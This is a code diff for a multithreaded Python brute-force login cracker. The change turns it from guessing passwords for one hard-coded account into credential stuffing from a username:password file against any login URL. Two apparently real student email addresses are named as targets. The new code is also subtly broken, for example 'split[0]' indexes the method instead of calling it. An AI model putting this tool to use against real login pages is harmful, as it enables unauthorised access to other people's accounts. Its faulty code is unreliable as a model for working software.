@@ -13,12 +13,10 @@ import threading
 import requests
 import time
 import sys
-from label import label
 
 class BruteForceCracker:
-    def __init__(self, url, username, error_message):
+    def __init__(self, url, error_message):
         self.url = url
-        self.username = username
         self.error_message = error_message
         
         for run in banner:
@@ -26,39 +24,42 @@ class BruteForceCracker:
             sys.stdout.flush()
             time.sleep(0.02)
 
-    def crack(self, password):
-        data_dict = {"email": self.username, "password": password}
+    def crack(self, username, password):
+        data_dict = {"email": username, "password": password}
         response = requests.post(self.url, data=data_dict)
         if self.error_message in str(response.content):
             return False
         
         else:
-            print("Username: ---> " + self.username)
+            print("Username: ---> " + username)
             print("Password: ---> " + password)
             return True
 
-def crack_passwords(passwords, cracker):
+def crack_passwords(usernames_passwords, cracker):
     count = 0
-    for password in passwords:
+    for username_password in usernames_passwords:
+        username = username_password.split[0]
+        password = username_password.split[1]
         count += 1
         password = password.strip()
-        print("Trying Password: {} Time For => {}".format(count, password))
-        if cracker.crack(password):
+        username = username.strip()
+        print("Trying Password & Username : {} Time For => {} : {}".format(count, username, password))
+        if cracker.crack(username, password):
             return
 
 def main():
     url = input("Enter Target Url: ")
     error = "Password incorrect! Please try again."
-    username="adrien.peccenini@student-cs.fr"
-    cracker = BruteForceCracker(url, username, error)
+    username="mohamed.mekkouri@student-cs.fr"
+    cracker = BruteForceCracker(url, error)
     
-    with open("passwords.txt", "r") as f:
+    with open("user_passwords.txt", "r") as f:
         chunk_size = 1000
         while True:
-            passwords = f.readlines(chunk_size)
-            if not passwords:
+            usernames_passwords = f.readlines(chunk_size)
+            if not usernames_passwords:
                 break
-            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
+            t = threading.Thread(target=crack_passwords, args=(usernames_passwords, cracker))
             t.start()
 
 if __name__ == '__main__':
